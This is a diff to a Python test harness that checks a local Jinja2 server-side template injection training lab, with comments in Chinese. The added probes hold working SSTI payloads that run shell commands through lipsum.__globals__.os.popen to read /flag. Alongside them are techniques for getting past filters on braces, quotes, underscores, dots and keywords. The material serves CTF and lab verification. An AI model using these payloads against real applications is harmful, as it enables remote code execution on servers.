@@ -31,6 +31,7 @@ import time
 import urllib.error
 import urllib.request
 from dataclasses import dataclass, field
+from urllib.parse import urlencode
 
 
 @dataclass
@@ -46,6 +47,10 @@ class RenderCheck:
     expect: str = ""
     mode: str = "god"
     note: str = ""
+    #: 附加 query 参数（用于 `request.args` 取值的题目，如 lab 02 的 L5/L6）
+    query: dict[str, str] = field(default_factory=dict)
+    #: 反向断言：期望渲染**抛异常**且异常文本包含该子串（用于记录踩坑点/反例）
+    expect_error: str = ""
 
 
 @dataclass
@@ -81,17 +86,78 @@ LABS: list[Lab] = [
         name="02-jinja-chain",
         image="ssti-jinja-chain:local",
         probes=[
-            RenderCheck("0", "{{7*7}}", "49"),
-            RenderCheck("1", "{{7*7}}", "WAF", note="L2 命中 {{ 被拦"),
-            RenderCheck("1", "{% print(7*7) %}", "49", note="L2 用 {% %} 绕过"),
-            RenderCheck("3", "{{ 7*7 }}", "49", note="L4 不含方括号则通过"),
-            RenderCheck("4", "{{7*7}}", "49", note="L5 不含引号，应正常通过"),
-            RenderCheck("4", "{{ 'a' }}", "WAF", note="L5 含引号被拦"),
+            # ---- L1 无过滤
+            RenderCheck("0", "{{7*7}}", "49", note="L1 基础求值"),
             RenderCheck(
                 "0",
                 "{{lipsum.__globals__.os.popen('cat /flag').read()}}",
                 FLAG_TMPL % "02",
-                note="经典链读 /flag",
+                note="L1 经典链读 /flag",
+            ),
+            # ---- L2 拦截 {{
+            RenderCheck("1", "{{7*7}}", "WAF", note="L2 命中 {{ 被拦"),
+            RenderCheck("1", "{% print(7*7) %}", "49", note="L2 用 {% %} 绕过"),
+            # ---- L3 盲渲染
+            RenderCheck("2", "ok", "correct", note="L3 盲关成功 => correct"),
+            RenderCheck("2", "{{ 1/0 }}", "wrong", note="L3 盲关异常 => wrong"),
+            # ---- L4 禁止方括号
+            RenderCheck("3", "{{ 7*7 }}", "49", note="L4 不含方括号则通过"),
+            RenderCheck("3", "{{(1,2,3)|first}}", "1", note="L4 用过滤器替代下标"),
+            # ---- L5 禁止引号
+            RenderCheck("4", "{{7*7}}", "49", note="L5 不含引号应通过"),
+            RenderCheck("4", "{{ 'a' }}", "WAF", note="L5 含引号被拦"),
+            RenderCheck(
+                "4",
+                "{{lipsum.__globals__.os.popen(request.args.c).read()}}",
+                FLAG_TMPL % "02",
+                note="L5 经 request.args 带入字符串，payload 无引号",
+                query={"c": "cat /flag"},
+            ),
+            # ---- L6 禁止下划线（字符 `_`）
+            RenderCheck("5", "{{()|attr('__class__')}}", "WAF", note="L6 字面 `_` 被拦"),
+            RenderCheck(
+                "5",
+                "{{lipsum[request.args.a][request.args.b][request.args.c](request.args.d)[request.args.e]()}}",
+                FLAG_TMPL % "02",
+                note="L6 属性名全部从请求带入，源码无 `_`",
+                query={
+                    "a": "__globals__", "b": "os", "c": "popen",
+                    "d": "cat /flag", "e": "read",
+                },
+            ),
+            RenderCheck(
+                "5",
+                "{{lipsum['%c%cglobals%c%c'|format(95,95,95,95)]['o'~'s']}}",
+                "module 'os'",
+                note="L6 用 '%c'|format(95) 运行期造下划线",
+            ),
+            # ---- L7 禁止点号（下标链；|attr 对 dict 不可用）
+            RenderCheck(
+                "6",
+                "{{lipsum['__globals__']['os']['popen']('cat /flag')['read']()}}",
+                FLAG_TMPL % "02",
+                note="L7 下标替代点号",
+            ),
+            RenderCheck(
+                "6",
+                "{{lipsum|attr('__globals__')|attr('os')|attr('popen')('cat /flag')|attr('read')()}}",
+                expect_error="UndefinedError",
+                note="L7 反例：|attr 只做 getattr，对 dict 不回退下标 ⇒ 整条链报 UndefinedError",
+            ),
+            # ---- L8 关键字子串（attr 被禁 ⇒ 不能用 |attr）
+            RenderCheck("7", "{{ 'attr' }}", "WAF", note="L8 子串 attr 被拦"),
+            RenderCheck(
+                "7",
+                "{{lipsum['__glo'~'bals__']['o'~'s']['po'~'pen']('cat /flag')['re'~'ad']()}}",
+                FLAG_TMPL % "02",
+                note="L8 拼接关键字 + 下标",
+            ),
+            # ---- L10 前缀置空 config/self
+            RenderCheck(
+                "9",
+                "{{lipsum.__globals__.os.popen('cat /flag').read()}}",
+                FLAG_TMPL % "02",
+                note="L10 前缀置空不影响 lipsum 链",
             ),
         ],
     ),
@@ -302,8 +368,11 @@ def verify_lab(lab: Lab, port: int, rep: Reporter, *, keep: bool) -> None:
             return
         for check in lab.probes:
             body = {"level": check.level, "template": check.template, "mode": check.mode}
+            url = f"http://127.0.0.1:{port}/api/render"
+            if check.query:
+                url += "?" + urlencode(check.query)
             try:
-                status, raw = http(f"http://127.0.0.1:{port}/api/render", method="POST", body=body)
+                status, raw = http(url, method="POST", body=body)
                 payload = json.loads(raw)
             except urllib.error.HTTPError as exc:
                 rep.bad(f"L{check.level} render [{(check.note or check.template)[:40]}]",
@@ -315,13 +384,22 @@ def verify_lab(lab: Lab, port: int, rep: Reporter, *, keep: bool) -> None:
                 continue
 
             out = str(payload.get("output", ""))
+            err = str(payload.get("error") or "")
             label = f"L{check.level} {(check.note or check.template)[:52]}"
-            if check.expect:
+
+            if check.expect_error:
+                # 反向断言：必须抛异常，且异常文本符合预期
+                if check.expect_error in err:
+                    rep.ok(f"{label} → 如期抛 {check.expect_error}")
+                else:
+                    rep.bad(label, f"期望异常含 {check.expect_error!r}，实际 error={err[:200]!r} "
+                                   f"output={out[:200]!r}")
+            elif check.expect:
                 if check.expect in out:
                     rep.ok(f"{label} → 含 {check.expect!r}")
                 else:
                     rep.bad(label, f"期望含 {check.expect!r}，实际 output={out[:300]!r} "
-                                   f"error={payload.get('error')!r}")
+                                   f"error={err[:200]!r}")
             else:
                 # expect 为空：不断言内容，只要求渲染没有抛异常
                 if payload.get("error") is None:
